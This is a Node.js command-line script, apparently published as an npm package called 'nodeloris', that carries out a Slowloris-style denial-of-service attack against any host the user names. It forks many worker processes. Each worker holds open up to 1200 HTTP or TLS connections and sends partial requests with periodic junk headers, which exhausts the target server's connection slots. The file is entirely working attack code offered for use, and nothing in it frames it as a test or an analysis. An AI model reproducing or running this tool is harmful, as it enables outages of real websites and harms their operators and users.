#!/usr/bin/env node
'use strict';
const cluster = require('node:cluster');
const net = require('node:net');
const tls = require('node:tls');
const { cl, cr, ascii } = require('@roflsec/rofl');

const args = process.argv.slice(2);
const CONNECT_TIMEOUT = 8000;

if (args.length === 0) {
  ascii();
  cl(cr.bold('\nNODELORIS TOOL BY ROFLSEC:\n'));
  cl('\nUsage:\n');
  cl('  From github:');
  cl('    node nodeloris.js <host>[:port] [-c <num>] [--workers <num>] [--https]\n');
  cl('  From npm:');
  cl('    nodeloris <host>[:port] [-c <num>] [--workers <num>] [--https]\n');
  process.exit(1);
}

let target = args[0];
let port = 80;
let isHttps = false;
let maxConnsPerWorker = 1200;
let numWorkers = 12;

if (target.includes(':')) {
  const [h, p] = target.split(':');
  target = h;
  port = parseInt(p);
}

for (let i = 1; i < args.length; i++) {
  if (args[i] === '-c' || args[i] === '--connections') maxConnsPerWorker = parseInt(args[i + 1]);
  if (args[i] === '--workers') numWorkers = parseInt(args[i + 1]);
  if (args[i] === '--https') isHttps = true;
}

if (isHttps && port === 80) port = 443;

if (cluster.isPrimary) {
  ascii();
  cl(cr.bold('\nNODELORIS TOOL BY ROFLSEC:\n'));
  cl(cr.yellow('[nodeloris] ') + cr.green('[Master] ') + 'PRESS CTRL+C TO STOP');
  cl(cr.yellow('[nodeloris] ') + cr.green('[Master] ') + `➤ ${numWorkers} workers | ${maxConnsPerWorker} connections/worker`);
  cl(cr.yellow('[nodeloris] ') + cr.green('[Master] ') + 'FORKING WORKERS ...\n');

  for (let i = 0; i < numWorkers; i++) cluster.fork();

  process.on('SIGINT', () => {
    cl('\n\n' + cr.yellow('[nodeloris] ') + cr.red('[Master] ') + 'SENDING SIGINT: EXITING ...\n');
    for (const id in cluster.workers) {
      if (cluster.workers[id]) cluster.workers[id].kill('SIGINT');
    }
    setTimeout(() => process.exit(0), 1500);
  });
} else {
  let openConns = 0;
  let pendingConns = 0;
  let packets = 0;
  let stopped = false;
  const sockets = new Set();

  const createConnection = () => {
    if (stopped || (openConns + pendingConns) >= maxConnsPerWorker) return;

    pendingConns++;

    const socket = isHttps
      ? tls.connect(port, target, { rejectUnauthorized: false })
      : net.connect(port, target);

    sockets.add(socket);

    let keepAliveInterval = null;
    let connectTimeout = null;
    let cleaned = false;
    let connected = false;

    const cleanup = () => {
      if (cleaned) return;
      cleaned = true;

      if (connectTimeout) {
        clearTimeout(connectTimeout);
        connectTimeout = null;
      }
      if (keepAliveInterval) {
        clearInterval(keepAliveInterval);
        keepAliveInterval = null;
      }

      sockets.delete(socket);

      if (connected) {
        openConns = Math.max(0, openConns - 1);
      } else {
        pendingConns = Math.max(0, pendingConns - 1);
      }

      if (!socket.destroyed) {
        socket.destroy();
      }
    };

    connectTimeout = setTimeout(() => {
      if (!connected) cleanup();
    }, CONNECT_TIMEOUT);

    socket.on('connect', () => {
      connected = true;
      if (connectTimeout) {
        clearTimeout(connectTimeout);
        connectTimeout = null;
      }
      pendingConns = Math.max(0, pendingConns - 1);
      openConns++;

      socket.write(
        `GET / HTTP/1.1\r\nHost: ${target}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\nConnection: keep-alive\r\n\r\n`
      );

      keepAliveInterval = setInterval(() => {
        if (socket.destroyed || stopped) {
          cleanup();
          return;
        }
        try {
          socket.write(`X-a${Math.random().toString(36).slice(2)}: keep\r\n`);
          packets++;
        } catch (_) {
          cleanup();
        }
      }, 11000 + Math.random() * 9000);
    });

    socket.on('error', () => {
      cleanup();
    });

    socket.on('close', () => {
      cleanup();
    });
  };

  for (let i = 0; i < 200; i++) {
    setTimeout(createConnection, i * 15);
  }

  setInterval(createConnection, 800);

  setInterval(() => {
    if (stopped) return;
    cl(
      cr.yellow('[nodeloris] ') +
      cr.green('[Worker] ') +
      cr.cyan(`[pid ${process.pid}] `) +
      `Established: ${openConns} | Pending: ${pendingConns} | Total: ${openConns + pendingConns}/${maxConnsPerWorker} | Packets: ${packets}`
    );
  }, 8000);

  process.on('SIGINT', () => {
    stopped = true;
    for (const socket of sockets) {
      if (!socket.destroyed) socket.destroy();
    }
    sockets.clear();
    setTimeout(() => process.exit(0), 600);
  });
}
